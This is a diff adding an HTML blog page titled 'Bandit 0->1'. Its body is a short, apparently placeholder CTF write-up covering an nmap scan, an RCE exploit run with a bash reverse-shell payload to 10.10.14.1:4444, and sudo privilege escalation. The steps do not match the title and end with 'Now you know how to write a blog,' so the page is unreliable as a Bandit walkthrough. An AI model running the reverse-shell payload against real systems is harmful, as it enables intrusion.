@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Bandit 0->1</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
+  <!-- Google AdSense Script -->
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" crossorigin="anonymous"></script>
+
+</head>
+
+<body>
+
+<!-- Left Vertical Ad -->
+<div class="vertical-ad left-ad">
+  <ins class="adsbygoogle"
+       style="display:block;width:160px;height:600px"
+       data-ad-client="ca-pub-xxxxxxxxxxxxxxxx"
+       data-ad-slot="1111111111"></ins>
+  <script>
+       (adsbygoogle = window.adsbygoogle || []).push({});
+  </script>
+</div>
+
+<!-- Right Vertical Ad -->
+<div class="vertical-ad right-ad">
+  <ins class="adsbygoogle"
+       style="display:block;width:160px;height:600px"
+       data-ad-client="ca-pub-xxxxxxxxxxxxxxxx"
+       data-ad-slot="2222222222"></ins>
+  <script>
+       (adsbygoogle = window.adsbygoogle || []).push({});
+  </script>
+</div>
+
+<!-- Header -->
+<header>
+  <h1>💻 TORHAT</h1>
+  <nav>
+    <a href="/index.html">Home</a>
+    <a href="/whoami.html">About</a>
+    <a href="https://hmcyberacademy.com/" target="_blank">GitHub</a>
+  </nav>
+</header>
+
+<!-- Blog Container -->
+<div class="blog-container">
+
+  <h1 class="blog-title">Bandit 0->1</h1>
+
+  <div class="blog-section">
+    <div class="video-wrapper">
+      <iframe 
+        class="vid-center" 
+        src="https://www.youtube.com/embed/-HwLALmQdqg?si=nLU2m1-3UxwDih36" 
+        title="YouTube video player" 
+        frameborder="0" 
+        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+        referrerpolicy="strict-origin-when-cross-origin" 
+        allowfullscreen>
+      </iframe>
+    </div>
+
+    <h2 class="blog-subtitle first-subtitle">🔍 Reconnaissance</h2>
+    <p class="blog-text">
+      I started with an Nmap scan to identify open ports and services running on the machine.
+    </p>
+    <div class="blog-code">
+<pre><code>nmap -sC -sV -oN initial_scan.txt 10.10.10.123</code></pre>
+    </div>
+    <img src="images/nmap-output.jpg" alt="Nmap Scan" class="blog-image">
+  </div>
+
+  <!-- Horizontal Ad after first section -->
+  <div class="horizontal-ad">
+    <ins class="adsbygoogle"
+         style="display:block"
+         data-ad-client="ca-pub-xxxxxxxxxxxxxxxx"
+         data-ad-slot="3333333333"
+         data-ad-format="auto"
+         data-full-width-responsive="true"></ins>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+  </div>
+
+  <div class="blog-section">
+    <h2 class="blog-subtitle">💥 Exploitation</h2>
+    <p class="blog-text">
+      A vulnerable web server running an outdated CMS was discovered. I crafted a payload using a known RCE exploit.
+    </p>
+    <div class="blog-code">
+<pre><code>python exploit.py --url http://10.10.10.123 --payload 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'</code></pre>
+    </div>
+    <img src="images/nmap-output.jpg" alt="Exploit Screenshot" class="blog-image">
+  </div>
+
+  <!-- Horizontal Ad after second section -->
+  <div class="horizontal-ad">
+    <ins class="adsbygoogle"
+         style="display:block"
+         data-ad-client="ca-pub-xxxxxxxxxxxxxxxx"
+         data-ad-slot="4444444444"
+         data-ad-format="auto"
+         data-full-width-responsive="true"></ins>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+  </div>
+
+  <div class="blog-section">
+    <h2 class="blog-subtitle">🏁 Privilege Escalation</h2>
+    <p class="blog-text">
+      After gaining a shell as `www-data`, I checked for sudo permissions and found a misconfigured binary.
+    </p>
+    <div class="blog-code">
+<pre><code>sudo /usr/bin/vuln_binary</code></pre>
+    </div>
+    <p class="blog-text">
+      Using `GTFObins`, I escalated to root.
+    </p>
+  </div>
+
+  <!-- Horizontal Ad after third section -->
+  <div class="horizontal-ad">
+    <ins class="adsbygoogle"
+         style="display:block"
+         data-ad-client="ca-pub-xxxxxxxxxxxxxxxx"
+         data-ad-slot="5555555555"
+         data-ad-format="auto"
+         data-full-width-responsive="true"></ins>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+  </div>
+
+  <div class="blog-section">
+    <h2 class="blog-subtitle">Conclusion</h2>
+    <p class="blog-text">
+        Now you know how to write a blog. Happy hacking!
+    </p>
+  </div>
+</div>
+
+<!-- Footer -->
+<footer>
+  <p>Contact me:</p>
+  <a href="https://twitter.com/@TOR_HAT" target="_blank"><i class="fab fa-twitter"></i></a>
+  <a href="https://www.linkedin.com/in/mukesh-pyda/" target="_blank"><i class="fab fa-linkedin"></i></a>
+  <a href="mailto:support@hmcyberacademy.com"><i class="fas fa-envelope"></i></a>
+  <p>&copy; 2025 HMCyberAcademy</p>
+</footer>
+
+</body>
+</html>
